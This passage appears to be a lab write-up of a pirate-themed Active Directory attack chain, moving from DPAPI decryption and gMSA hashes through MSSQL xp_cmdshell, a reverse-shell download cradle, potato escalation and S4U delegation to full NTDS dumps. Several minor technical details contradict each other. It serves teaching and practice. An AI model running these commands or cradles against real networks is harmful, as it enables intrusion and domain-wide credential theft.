We didn't need to crack a single user's password. In Active Directory, machine accounts have identities too, and their cryptographic keys are the ultimate skeleton keys — they open every door the domain trusts, and they exist the moment the host is joined. But the LSA dump on `JOLLYROGER` didn't just hand us the machine account's Kerberos keys; it handed us the DPAPI masterkeys that cage every cached credential on the box.

Those masterkeys unlock the DPAPI-encrypted credential stores sitting physically on the hard drive. One of those locked stores belonged to `pirate1`. Instead of guessing passwords, we just paired the locked file from the disk with the masterkey ripped straight from the LSA:

```zsh
➜ nxc smb jollyroger.pirates.brb \
    -u 'administrator' -H '4dae99ecd2b1b0bc6cc48538ea284347' \
    --local-auth --dpapi

...[snip]...
SMB         jollyroger.pirates.brb 445    JOLLYROGER       dpapi_machinekey:5a2461501a1e9e90aeae5db468d1a797f31d6950
SMB         jollyroger.pirates.brb 445    JOLLYROGER       dpapi_userkey:b7f909dbfe450c597454fcdb6775a988662e0446
```

### Uncaging the Masterkeys

The SAM dump from the same shell holds a cached domain credential — `pirate1:1001:...:e19ccf75ee54e06b06a5907af13cef42`. That's the NT hash of a domain account local to the box, and it's the login we're after.

To get the plaintext, we need two things: the locked credential file from the disk, and the DPAPI masterkey to open it. NetExec’s `--dpapi` module had already done the heavy lifting by extracting `pirate1`'s decrypted masterkey directly from the LSA.

With the key in hand, we drop into our WinRM shell, locate the encrypted credential blob in `pirate1`'s `AppData` folder, and download it to our attack machine.

```zsh
PS > !download "C:\Users\pirate1\AppData\Roaming\Microsoft\Credentials\82D585BFBAA099ADDEA463533658FDBA"

➜ dpapi.py credential -file "82D585BFBAA099ADDEA463533658FDBA" \
    -ck b7f909dbfe450c597454fcdb6775a988662e0446

[*] Target: LegacyGeneric:target=smb.queenrev
[*] User: ironhook
[*] Password: brb{5d26ec0024167fdf8a45a70eff4ade36}
```

The DPAPI unwrap yields `ironhook`'s credential — the domain account, its password, and the SMB target it was cached for (`smb.queenrev`). `ironhook` is a domain account that logs into QUEENREV. That's the pivot credential. Flag five is on the books.

The most elegant part? The whole unwrap happened offline. By exfiltrating the encrypted vault and combining it with the masterkey we dumped earlier, we cracked it locally, leaving zero decryption artifacts for EDR to catch on `JOLLYROGER`.

The spray with `ironhook` confirms the account is live on all four hosts — domain credentials tend to travel:

```zsh
➜ nxc smb 192.168.10.10-13 \
    -u 'ironhook' -p 'brb{5d26ec0024167fdf8a45a70eff4ade36}'

...[snip]...
SMB         192.168.10.12   445    QUEENREV         [+] PIRATES.BRB\ironhook:brb{5d26ec0024167fdf8a45a70eff4ade36}
SMB         192.168.10.11   445    JOLLYROGER       [+] PIRATES.BRB\ironhook:brb{5d26ec0024167fdf8a45a70eff4ade36}
SMB         192.168.10.13   445    FLYINGDUTCHMAN   [+] PIRATES.BRB\ironhook:brb{5d26ec0024167fdf8a45a70eff4ade36}
SMB         192.168.10.10   445    BLACKPEARL       [+] PIRATES.BRB\ironhook:brb{5d26ec0024167fdf8a45a70eff4ade36}
```

Flag five is already in hand from the DPAPI unwrap. The spray with `ironhook` is the next thing we do — it's how we map our targets and see who can touch what. All four hosts answer to a domain user whose password was caged in `JOLLYROGER`'s LSA. But knowing the board and making a move are two different things. The move is the share enumeration on `QUEENREV`. `ISLAND2` is where we find `shipping.txt` — a file that isn't flag-bearing itself, but rather a gMSA blob. First, the share:

```zsh
➜ nxc smb queenrev.pirates.brb \
    -u 'ironhook' -p 'brb{5d26ec0024167fdf8a45a70eff4ade36}' \
    --spider 'ISLAND2' --regex .

...[snip]...
SMB         192.168.10.12   445    QUEENREV         //192.168.10.12/ISLAND2/shipping.txt [lastm:'2026-08-22 20:22' size:1137]
```

```zsh
➜ nxc smb queenrev.pirates.brb \
    -u 'ironhook' -p 'brb{5d26ec0024167fdf8a45a70eff4ade36}' \
    --share ISLAND2 \
    --get-file shipping.txt shipping.txt

➜ cat shipping.txt
Just found this on the back of the ship, is this sensitive information ?

Account: gMSA-shipping$
msDS-ManagedPassword:
1,0,0,0,34,1,0,0,16,0,0,0,18,1,26,1,224,34,122,22,133,197,209,76,188,163,3,100,177,198,190,253,149,82,93,148,66,28,224,213,41,233,159,140,141,212,31,177,121,231,13,237,21,72,222,205,14,90,195,184,202,165,126,75,186,24,157,195,199,236,235,4,235,56,238,91,192,138,223,169,201,64,64,87,184,103,46,50,184,101,228,222,172,110,65,113,38,116,228,100,87,127,93,213,242,88,170,210,73,231,186,145,86,234,197,51,121,49,7,99,147,149,38,51,21,146,245,156,195,166,236,203,173,254,171,228,92,208,115,224,72,146,211,143,179,64,121,181,200,166,202,210,79,112,133,129,223,62,3,34,71,214,49,195,60,126,172,72,56,55,55,232,169,57,8,143,220,123,38,72,41,143,173,61,98,38,193,113,117,54,82,40,200,232,94,249,208,237,216,92,194,132,241,26,110,185,189,240,25,133,219,41,170,238,215,84,99,63,45,190,141,126,171,86,241,179,69,130,55,30,124,218,188,57,184,168,49,10,178,23,159,90,134,209,131,40,141,60,167,12,144,221,28,148,234,17,13,210,104,160,192,193,47,28,80,90,10,139,71,140,82,64,0,0,99,226,218,154,72,23,0,0,99,132,10,232,71,23,0,0
```

`shipping.txt` is the `gMSA-shipping$` `msDS-ManagedPassword` blob, parsed by the gMSA parser into the account's NT hash. The parser reads the XML, extracts the protected key material, and computes the NT hash — the same hash the domain uses when it authenticates the account:

```zsh
➜ python3 gmsa-parser.py shipping.txt
[+] Extracted from : shipping.txt
NT Hash: 166e0cf476a975469c22082d75a36bac
```

That's the managed service account's hash. `gMSA-shipping$` is a domain computer object with a password managed by the domain — you don't authenticate as it with a password you know, you authenticate with the hash the domain rotated for it. And that hash, once you have it, is valid on whatever services trust the account. On this fleet, that includes MSSQL on `QUEENREV`:

```zsh
➜ nxc smb 192.168.10.10-13 \
    -u 'gMSA-shipping$' -H '166e0cf476a975469c22082d75a36bac'

SMB         192.168.10.13   445    FLYINGDUTCHMAN   [+] PIRATES.BRB\gMSA-shipping$:166e0cf476a975469c22082d75a36bac
SMB         192.168.10.11   445    JOLLYROGER       [+] PIRATES.BRB\gMSA-shipping$:166e0cf476a975469c22082d75a36bac
SMB         192.168.10.10   445    BLACKPEARL       [+] PIRATES.BRB\gMSA-shipping$:166e0cf476a975469c22082d75a36bac
SMB         192.168.10.12   445    QUEENREV         [+] PIRATES.BRB\gMSA-shipping$:166e0cf476a975469c22082d75a36bac
```

### The Gunpowder and the Galley Oven (MSSQL to SYSTEM)

`gMSA-shipping$` is a valid credential on all four hosts. On `QUEENREV`, the interesting service isn't SMB — it's MSSQL on port 1433, where the account can impersonate `sa`:

```zsh
➜ nxc mssql queenrev.pirates.brb \
    -u 'gMSA-shipping$' -H '166e0cf476a975469c22082d75a36bac' \
    -M mssql_priv

MSSQL       192.168.10.12   1433   QUEENREV         [*] Windows Server 2022 Build 20348 (name:QUEENREV) (domain:PIRATES.BRB) (EncryptionReq:False)
MSSQL       192.168.10.12   1433   QUEENREV         [+] PIRATES.BRB\gMSA-shipping$:166e0cf476a975469c22082d75a36bac
MSSQL_PRIV  192.168.10.12   1433   QUEENREV         [+] PIRATES\gMSA-shipping$ can impersonate: sa (sysadmin)
```

`gMSA-shipping$` holds sysadmin-equivalent impersonation rights over `sa`. `EXECUTE AS LOGIN = 'sa'` flips the execution context from the app account to the database administrator, and from there the database surface area is ours to query — including `SECRET_GOLD.dbo.island`, which is where `QUEENREV`'s database flag lives:

```zsh
➜ nxc mssql queenrev.pirates.brb \
    -u 'gMSA-shipping$' -H '166e0cf476a975469c22082d75a36bac' \
    -q "EXECUTE AS LOGIN = 'sa'; SELECT * FROM SECRET_GOLD.dbo.island;"

...[snip]...
MSSQL       192.168.10.12   1433   QUEENREV         id:10
MSSQL       192.168.10.12   1433   QUEENREV         name:Golden Skull Atoll
MSSQL       192.168.10.12   1433   QUEENREV         comment:brb{c37c5303024c911bb23a759d0f4cad75}
```

That's the sixth flag, pulled straight from the database. But the SQL shell isn't the prize — the pivot to the host is. The MSSQL service on `QUEENREV` runs under `nt service\mssql$sqlexpress`, and that service account has `SeImpersonatePrivilege` and the other privileges that make `xp_cmdshell` work. Enable it from inside the `sa` context, and the SQL server can run arbitrary OS commands as the service account:

```zsh
➜ nxc mssql queenrev.pirates.brb \
    -u 'gMSA-shipping$' -H '166e0cf476a975469c22082d75a36bac' \
    -q "EXECUTE AS LOGIN = 'sa'; EXEC xp_cmdshell 'whoami';"

...[snip]...
MSSQL       192.168.10.12   1433   QUEENREV         output:nt service\mssql$sqlexpress
```

The SQL service's process identity is `nt service\mssql$sqlexpress`. It's not SYSTEM, but it's a service account with impersonation rights. To go higher, we cross the bridge from the SQL shell to an OS shell — a PowerShell reverse shell carried by `xp_cmdshell`, listening on the same listener we used for the relay earlier:

```zsh
# Start the listener
➜ rlwrap -cAr ncat -lnvp 9294

# Execute the Powershell Cradle
➜ nxc mssql queenrev.pirates.brb \
    -u 'gMSA-shipping$' -H '166e0cf476a975469c22082d75a36bac' \
    -q "EXECUTE AS LOGIN = 'sa'; EXEC xp_cmdshell 'powershell.exe -ep bypass -nop -w hidden -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxADAALgAxADMAMAAvAHMAaABlAGwAbAAuAHAAcwAxACIAKQA=';"

# Shell
PS > whoami; hostname
nt service\mssql$sqlexpress
QUEENREV

PS > whoami /priv

...[snip]...
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
```

The reverse shell lands on `QUEENREV` as the SQL service account, with `SeImpersonatePrivilege` enabled. That privilege is the potato's entry point. `potato.exe` uses the impersonation privilege plus a named-pipe trick to elevate to SYSTEM — the classic ESEU/PrintNotify/NtlmPrv path, and on this box it lands cleanly:

```zsh
# Start the listener
➜ rlwrap -cAr ncat -lnvp 9294

# Potato—Time
PS > certutil -urlcache -f -split http://192.168.10.131/CrystalPotato.exe potato.exe

PS > .\potato.exe -c 'powershell.exe -ep bypass -nop -w hidden -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxADAALgAxADMAMAAvAHMAaABlAGwAbAAuAHAAcwAxACIAKQA='

# Shell
➜ rlwrap -cAr ncat -lnvp 9295

...[snip]...

PS > whoami; hostname
nt authority\system
QUEENREV
```

### Claiming the Captain's Hat (TGT Extraction)

SYSTEM on `QUEENREV`. From there, the `C:\Flag` directory is readable, and the flag file is there:

```powershell
PS > cat C:\Flag\*
brb{829f6694eab03576120fa24bfe76e67d}

Congratulations! You've escalated privileges on QUEENREV via S4U2Self!
```

That's the OS flag on `QUEENREV`. The potato climbed the privilege ladder from a service account to SYSTEM, and SYSTEM can read what the service account could only hint at. Flag seven is on the books. Every Domain Admin thinks their fleet is unsinkable until someone finds an unquoted service path in the bilges — or in this case, until someone realizes the SQL service account has `SeImpersonatePrivilege` and the potato binary is a single HTTPS download away.

The final move before the ghost ship is the `QUEENREV$` TGT. SYSTEM owns the Kerberos ticket cache locally, and Rubeus can harvest it from the running session. The `triage` command shows what's in the cache, and the `tgtdeleg` command extracts a delegation-capable TGT for `QUEENREV$`:

```powershell
PS > certutil -urlcache -f -split http://192.168.10.131/Rubeus.exe Rubeus.exe

PS > .\rubeus.exe tgtdeleg /nowrap
[*] Action: Request Fake Delegation TGT (current user)
[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'
[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/BLACKPEARL.PIRATES.BRB'
[+] Delegation request success! AP-REQ delegation ticket is now in GSS-API output.
[*] Found the AP-REQ delegation ticket in the GSS-API output.
[*] base64(ticket.kirbi):
      doIFFjCCBRKgAwIBBaEDAgEWooIEHTCCBBlhggQVMIIEEa...[snip]...
```

The `tgtdeleg` output is a base64-encoded Kerberos ticket in kirbi format. Convert it to a ccache file, and it becomes the credential we use for the delegation steps on the next ship:

```zsh
➜ echo -n 'doIFFjCCBRKgAwIBBaEDAgEWooIEHTCCBBlhggQVMIIEEa...[snip]...' | base64 -d > queenrev.kirbi

➜ ticketConverter.py queenrev.kirbi queenrev.ccache
[*] converting kirbi to ccache...
[+] done
```

`queenrev.ccache` is now the `QUEENREV$` TGT in a form `nxc` can use. We test the ticket against JOLLYROGER just to prove the KDC accepts it, and the domain confirms we are now sailing under the machine account's colors:

```zsh
➜ env KRB5CCNAME=queenrev.ccache \
nxc smb jollyroger.pirates.brb --use-kcache

...[snip]...
SMB         jollyroger.pirates.brb 445    JOLLYROGER       [+] PIRATES.BRB\QUEENREV$ from ccache
```

The TGT is valid. Now we point it back at `QUEENREV` itself to execute a local delegation, dumping the SAM and LSA secrets to recover the machine account's long-term AES keys:

```zsh
➜ env KRB5CCNAME=queenrev.ccache \
nxc smb queenrev.pirates.brb \
    --use-kcache --delegate Administrator --self --lsa --sam

SMB         queenrev.pirates.brb 445    QUEENREV         [*] Windows Server 2022 Build 20348 x64 (name:QUEENREV) (domain:PIRATES.BRB) (signing:False) (SMBv1:False)
SMB         queenrev.pirates.brb 445    QUEENREV         [+] PIRATES.BRB\Administrator through S4U with QUEENREV$ (Pwn3d!)
...[snip]...
SMB         queenrev.pirates.brb 445    QUEENREV         PIRATES\QUEENREV$:aes256-cts-hmac-sha1-96:8a08ce2ff402b3fbb31b7566ba319fd41ee1f4b23760ffddfd15818435d05b21
...
SMB         queenrev.pirates.brb 445    QUEENREV         PIRATES\QUEENREV$:aad3b435b51404eeaad3b435b51404ee:d77fec19bbe1f2579a9631391f3720d2:::
```

That's the mutiny complete. Not a breach of the database server's perimeter — a takeover of the database service itself, from the inside, using the service account's own rights against the host. The pivot chain: DPAPI ➜ domain account ➜ gMSA blob ➜ MSSQL ➜ OS shell ➜ potato ➜ SYSTEM ➜ Rubeus ➜ TGT. Each step used the previous step's output as its input, and the last step handed us the machine account's identity for the last ship in the fleet.

---

## Phase 3: Navigating the Ghost Ship (Walking the KCD Treaty)

The last ship is the ghost one — `FLYINGDUTCHMAN`, a host that's been cursed to sail forever, unreachable by ordinary means. In the Caribbean, the Flying Dutchman was a ship doomed to sail the oceans forever, never making port, never resting — a ghost story that kept sailors awake in their hammocks. On this network, `FLYINGDUTCHMAN` is a server that's been set up as unreachable by ordinary means: no direct admin access, no planted credential, no obvious service to exploit. But the domain has marked it with a constrained delegation right that bypasses all of that: `QUEENREV$` is allowed to impersonate users on `FLYINGDUTCHMAN`'s HTTP service. That right was there before we arrived. We don't create it. We inherit it, the way you inherit a curse from the ship you board — except in this case the "curse" is a Kerberos right, and the "ship" is a Windows Server 2022 box.

Kerberos Constrained Delegation — KCD — is the mechanism behind this. Unlike RBCD, where the right lives on the target and is written by whoever holds the ACL, KCD is configured on the *source* object: the `msDS-AllowedToDelegateTo` attribute lists the services the account may impersonate. It's a pre-approved delegation treaty, scoped to specific services, historically the more restrictive of the two models. On paper, it's the safer design. In practice, it's a delegation path that's already been opened by whoever configured the domain, and if you hold the right account — or can become the right account — you can walk it. The trust graph is just a treasure map drawn by a drunk architect, and on this map the route to `FLYINGDUTCHMAN` is marked in ink that was dry before we ever got on the first ship.

The path itself is the S4U exchange, which has two parts. S4U2Self is the KDC's answer to the question: *if this account asks to represent itself on this service, what ticket do you give it?* The KDC issues a service ticket for the account to the target service, encrypted under the service's long-term key. S4U2Proxy is the second question: *given that this account holds a ticket to an intermediate service, can it ask for a ticket to a downstream service on behalf of a user?* If the delegation right permits it, the KDC issues the proxy ticket, and that ticket is the one that carries the impersonated user's identity to the final destination. When an app tells you what it hides, it's telling you what it queries — and KCD tells you which accounts can query which services under whose identity. That's the whole game in eleven lines, if you know where to look.

On `FLYINGDUTCHMAN`, the pre-existing right in the directory is — the pre-existing curse, the treaty we inherited:

```zsh
LDAP        192.168.10.10   389    BLACKPEARL       QUEENREV$   Computer    Constrained    host/FLYINGDUTCHMAN.PIRATES.BRB
```

That's the constrained delegation edge we found at the start. `QUEENREV$` holds the right to impersonate users on `FLYINGDUTCHMAN`'s HTTP service. Once Phase 2 gives us `QUEENREV$`'s AES keys, we can authenticate as `QUEENREV$` to the KDC and walk the treaty: request the S4U2Self ticket for the HTTP service on `FLYINGDUTCHMAN`, then request the S4U2Proxy ticket to impersonate `Administrator` on that same service — because the constrained delegation right permits the impersonation of any user on that service.

The final leap to the ghost ship doesn't require another relay or a new exploit. The KCD treaty to `FLYINGDUTCHMAN` is already written in the directory. We don't need to write an RBCD rule for this hop; we just need to parley with the KDC using the right account — `QUEENREV$` — and the right keys to authenticate as it. Both of those are the output of Phase 2 and our RBCD foothold on `QUEENREV`.

Kerberos tickets are just digital letters of marque — and now we hold one signed by the Domain Controller itself.

### The First Leg: Authorizing the Boarding Party

The command sequence for this final phase runs in two delegation legs, both of them S4U exchanges.

We already know the delegation picture from our initial recon: `QUEENREV$` is allowed to delegate to `FLYINGDUTCHMAN`, but we need a way to get a forwardable Administrator ticket onto `QUEENREV` first.

What is missing is the bridge between them. Because we now hold `QUEENREV$`'s AES key from the LSA dump, `QUEENREV$` gets to edit its own `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute. We use that authority to forge the bridge, granting `JOLLYROGER$` the explicit right to impersonate users on `QUEENREV$`:

```zsh
➜ rbcd.py pirates.brb/'QUEENREV$' \
    -aesKey 8a08ce2ff402b3fbb31b7566ba319fd41ee1f4b23760ffddfd15818435d05b21 \
    -dc-ip 192.168.10.10 \
    -action write \
    -delegate-from 'JOLLYROGER$' \
    -delegate-to 'QUEENREV$'

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] JOLLYROGER$ can now impersonate users on QUEENREV$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     JOLLYROGER$   (S-1-5-21-615922571-2429191732-2990696654-1105)
```

The bridge is built. The second leg is the S4U chain itself. We walk the RBCD treaty we just wrote on `QUEENREV` using `JOLLYROGER$`'s AES key — the key from Phase 1's LSA dump. `getST.py` does the S4U2Self step (asking the KDC for a service ticket for `JOLLYROGER$` to `host/QUEENREV`), then the S4U2Proxy step (asking the KDC to proxy that ticket as `Administrator` on `host/QUEENREV`). The RBCD right we just wrote is what lets the proxy step succeed:

```zsh
➜ getST.py -spn 'host/QUEENREV.PIRATES.BRB' \
    -impersonate Administrator \
    -aesKey 949584026e4d0f1588e2dafda8defd278b3d0b6ba0489618ee6821f0e8698338 \
    'PIRATES.BRB/JOLLYROGER$'

...[snip]...
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@host_QUEENREV.PIRATES.BRB@PIRATES.BRB.ccache
```

That ccache is `Administrator` as a service ticket to `host/QUEENREV` — the RBCD leg is complete. We use it to authenticate to `QUEENREV` and confirm the foothold:

```zsh
➜ env KRB5CCNAME=Administrator@host_QUEENREV.PIRATES.BRB@PIRATES.BRB.ccache \
nxc smb queenrev.pirates.brb --use-kcache

SMB         queenrev.pirates.brb 445    QUEENREV         [*] Windows Server 2022 Build 20348 x64 (name:QUEENREV) (domain:PIRATES.BRB) (signing:False) (SMBv1:False)
SMB         queenrev.pirates.brb 445    QUEENREV         [+] PIRATES.BRB\Administrator from ccache (Pwn3d!)
```

### The Second Leg: Executing the Treaty

`QUEENREV` isn't the end of the line. The end of the line is the KCD treaty that was already in the directory before we touched anything.

For this final leap, we use `QUEENREV$`'s own AES key. We ask for the S4U2Self ticket to `host/FLYINGDUTCHMAN`, and then the S4U2Proxy ticket impersonating `Administrator` on that service. The proxy is allowed because of the pre-existing constrained delegation right.

The trick on this fleet is that the KCD right is to the HTTP service. To make the walk succeed, we use the `-additional-ticket` flag: we reuse the `Administrator@host_QUEENREV` ticket from the RBCD leg as the forwardable ticket for the S4U2Proxy step, bypassing the need for KCD with protocol transition:

```zsh
➜ getST.py -spn host/FLYINGDUTCHMAN.PIRATES.BRB \
    -impersonate Administrator \
    -additional-ticket Administrator@host_QUEENREV.PIRATES.BRB@PIRATES.BRB.ccache \
    -aesKey 8a08ce2ff402b3fbb31b7566ba319fd41ee1f4b23760ffddfd15818435d05b21 \
    'PIRATES.BRB/QUEENREV$'

...[snip]...
[*] Impersonating Administrator
[*]     Using additional ticket Administrator@host_QUEENREV.PIRATES.BRB@PIRATES.BRB.ccache instead of S4U2Self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@host_FLYINGDUTCHMAN.PIRATES.BRB@PIRATES.BRB.ccache
```

Two delegation primitives, two machine accounts, one chain. We board the ghost ship:

```zsh
➜ env KRB5CCNAME=Administrator@host_FLYINGDUTCHMAN.PIRATES.BRB@PIRATES.BRB.ccache \
nxc smb flyingdutchman.pirates.brb --use-kcache

SMB         flyingdutchman.pirates.brb 445    FLYINGDUTCHMAN   [*] Windows Server 2022 Build 20348 x64 (name:FLYINGDUTCHMAN) (domain:PIRATES.BRB) (signing:False) (SMBv1:False)
SMB         flyingdutchman.pirates.brb 445    FLYINGDUTCHMAN   [+] PIRATES.BRB\Administrator from ccache (Pwn3d!)
```

---

## Epilogue: NTDS in a Bottle

`Pwn3d!`. The ghost ship is boarded as Domain Administrator. Dropping anchor in the Domain Controller — we didn't sail into the harbor; the harbor sailed to us, one delegation step at a time.

Flag eight is the destination. We pop an interactive shell using the final ticket and take it:

```zsh
➜ env KRB5CCNAME=Administrator@host_FLYINGDUTCHMAN.PIRATES.BRB@PIRATES.BRB.ccache \
evil_winrmexec -k flyingdutchman.pirates.brb

...[snip]...

PS C:\Users\Administrator.PIRATES\Documents> whoami; hostname
pirates\administrator
FLYINGDUTCHMAN

PS C:\Users\Administrator.PIRATES\Documents> type /Flag/*
brb{3fc1559c49d4313b174ea06d300b5ab1}
```

But flags are for CTFs. When you own a Domain Controller, you take the domain's soul. We dump the LSA one last time to grab `FLYINGDUTCHMAN$`'s machine keys, just in case the domain tries to change the locks:

```zsh
➜ env KRB5CCNAME=Administrator@host_FLYINGDUTCHMAN.PIRATES.BRB@PIRATES.BRB.ccache \
nxc smb flyingdutchman.pirates.brb --use-kcache --sam --lsa

...[snip]...
SMB         flyingdutchman.pirates.brb 445    FLYINGDUTCHMAN   Administrator:500:aad3b435b51404eeaad3b435b51404ee:d43f1995dd0942e27c1650a4256ba2dd:::
...[snip]...
PIRATES\FLYINGDUTCHMAN$:aes256-cts-hmac-sha1-96:f5440ef2e512ab0b257cfedf29a13e07e16fe1015265c19c89db9f58d79dddf6
SMB         flyingdutchman.pirates.brb 445    FLYINGDUTCHMAN   PIRATES\FLYINGDUTCHMAN$:aes128-cts-hmac-sha1-96:f12071d6c684baa1cfd8b7f90e1260b7
SMB         flyingdutchman.pirates.brb 445    FLYINGDUTCHMAN   PIRATES\FLYINGDUTCHMAN$:des-cbc-md5:51514975264079ea
SMB         flyingdutchman.pirates.brb 445    FLYINGDUTCHMAN
SMB         flyingdutchman.pirates.brb 445    FLYINGDUTCHMAN   PIRATES\FLYINGDUTCHMAN$:aad3b435b51404eeaad3b435b51404ee:04a22abe6e0eb87b244c074a0a912d00:::
```

### Sacking the Captain's Quarters (`BLACKPEARL` Domination)

In the hold of the ghost ship, we find the ultimate treasure. Not a flag, but an offline backup zip of the `NTDS.dit` — the Active Directory database containing the password hash of every single user, computer, and service in the `PIRATES.BRB` domain. We don't even need to run a live DCSync against `BLACKPEARL`. We just download the zip file and walk away with the keys to the entire kingdom.

```powershell
PS C:\BACKUP> tree . /a /f
...
C:\BACKUP
|   NTDS.zip
|
\---NTDS
    +---Active Directory
    \---Registry

PS C:\BACKUP> !download NTDS.zip
```

Having an offline `NTDS.dit` is like having an entire crew's souls trapped inside an antique bottle. You don't break the bottle on the rocks with a noisy DCSync over the network; you uncork it quietly in the dark using the system hive as your key.

The `ntds.dit` database is just a locked box without its decryption key, but the backup archive thoughtfully included the `registry/SYSTEM` hive. That hive holds the Boot Key (PEK) needed to decrypt the database offline.


```zsh
➜ 7z x NTDS.zip

➜ ls -lR NTDS
NTDS:
total 8
drwxr-xr-x 2 kaladin kaladin 4096 Aug 29  2025 'Active Directory'/
drwxr-xr-x 2 kaladin kaladin 4096 Aug 29  2025  registry/

'NTDS/Active Directory':
total 32784
-rw-r--r-- 1 kaladin kaladin 33554432 Aug 29  2025 ntds.dit
-rw-r--r-- 1 kaladin kaladin    16384 Aug 29  2025 ntds.jfm

NTDS/registry:
total 16672
-rw-r--r-- 1 kaladin kaladin    32768 Aug 29  2025 SECURITY
-rw-r--r-- 1 kaladin kaladin 17039360 Aug 29  2025 SYSTEM
```

Instead of just indiscriminately dumping hashes, we dissect the domain surgically. We use Synacktiv's `ntdissector` to parse the `ntds.dit` offline, using the `SYSTEM` hive to decrypt the PEK and carving the entire Active Directory structure into readable JSON files. No noisy DCSync over the wire. Just quiet, offline forensics.

```zsh
➜ ntdissector -system "NTDS/registry/SYSTEM" -ntds "NTDS/Active Directory/ntds.dit" -outputdir /tmp/ntdissector/ -ts -f all
[2026-09-15 19:26:40] [*] PEK # 0 found and decrypted: 6ae0bab06d45d762e45769e13823395f
[2026-09-15 19:26:40] [*] Filtering records with this list of object classes :  ['all']
...
[2026-09-15 19:26:40] [*] Processing 3703 serialization tasks

➜ ls /tmp/ntdissector/out/0073cbb4a25fe52461c5fb5f94b5ce13
...[snip]...
computer.json            group.json                msDS-ShadowPrincipalContainer.json
configuration.json       infrastructureUpdate.json nTDSDSA.json
container.json           ipsecPolicy.json          organizationalUnit.json
domainDNS.json           lostAndFound.json         user.json
```

The domain's entire configuration is now laid out in flat files on our attack box. In Active Directory, metadata is often as dangerous as the cryptographic material. We target the `user.json` file with `jq`, hunting for a classic administrative failure: passwords left in the description attribute.

```zsh
➜ jq -r 'select(.description) | "\(.sAMAccountName): \(.description)"' /tmp/ntdissector/out/0073cbb4a25fe52461c5fb5f94b5ce13/user.json

Administrator: Built-in account for administering the computer/domain
krbtgt: Key Distribution Center Service Account
Guest: Built-in account for guest access to the computer/domain
blackbeard: REDqC8aQtyhd78A
```

There it is. `blackbeard` has a plaintext string sitting in his description field: `REDqC8aQtyhd78A`.

We take the credential straight to `BLACKPEARL`, the flagship Domain Controller. But the pirate left a trap. Authenticating as `blackbeard` fails. The description wasn't his password—it was the captain's. We point the same string at the `administrator` account:

```zsh
➜ nxc smb blackpearl.pirates.brb \
    -u blackbeard -p REDqC8aQtyhd78A
SMB         192.168.10.10   445    BLACKPEARL       [*] Windows Server 2022 Build 20348 x64 (name:BLACKPEARL) (domain:PIRATES.BRB) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         192.168.10.10   445    BLACKPEARL       [-] PIRATES.BRB\blackbeard:REDqC8aQtyhd78A STATUS_LOGON_FAILURE

➜ nxc smb blackpearl.pirates.brb \
    -u administrator -p REDqC8aQtyhd78A
SMB         192.168.10.10   445    BLACKPEARL       [*] Windows Server 2022 Build 20348 x64 (name:BLACKPEARL) (domain:PIRATES.BRB) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         192.168.10.10   445    BLACKPEARL       [+] PIRATES.BRB\administrator:REDqC8aQtyhd78A (Pwn3d!)
```

`Pwn3d!`. The flagship is ours.

The final command isn't a pivot; it's a victory lap. We use our live SMB session as the Domain Administrator to initiate a live NTDS extraction directly from `BLACKPEARL`, proving total operational control over the fleet.


```zsh
➜ nxc smb blackpearl.pirates.brb \
    -u administrator -p REDqC8aQtyhd78A --ntds

SMB         192.168.10.10   445    BLACKPEARL       [*] Windows Server 2022 Build 20348 x64 (name:BLACKPEARL) (domain:PIRATES.BRB) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         192.168.10.10   445    BLACKPEARL       [+] PIRATES.BRB\administrator:REDqC8aQtyhd78A (Pwn3d!)
SMB         192.168.10.10   445    BLACKPEARL       [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         192.168.10.10   445    BLACKPEARL       Administrator:500:aad3b435b51404eeaad3b435b51404ee:be769e437dc1856f3c1cb9c5b6dfbae0:::
SMB         192.168.10.10   445    BLACKPEARL       Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.10.10   445    BLACKPEARL       krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5e81b5440e2c0cf1da1a0e0d1dacf55b:::
...[snip]...
```

That last line is the anchor of the whole domain. `krbtgt`'s NT hash — `5e81b5440e2c0cf1da1a0e0d1dacf55b` — is the master key the KDC uses to sign every ticket it ever issues. Control it, and you can forge tickets for anyone, for any service, for any length of time.

```
5e81b5440e2c0cf1da1a0e0d1dacf55b
```

The ghost ship gave us the map, the offline backup gave us the key, and the Domain Controller surrendered without a single exploit fired against it. The fleet is captured, and the chart is complete.

---

## Closing Thoughts

We didn't break a single lock on this fleet. We walked the permitted paths — the ones drawn by the drunk architect, the ones that were there before we arrived, the ones carved by a printer leaking an NTLMv1 hash and a backup share holding a bottled domain soul. This lab is a masterclass in how a domain can be owned through the seams between its intended trust boundaries, rather than through a single exploit. NetExec was the spyglass, the spray rack, and the lockpick for every door — the whole chain ran on it.

The real lesson spans the entire voyage: **delegation primitives walk the domain when the directory hands out the right to use them, but absolute control is achieved when an administrative backup is left exposed.**

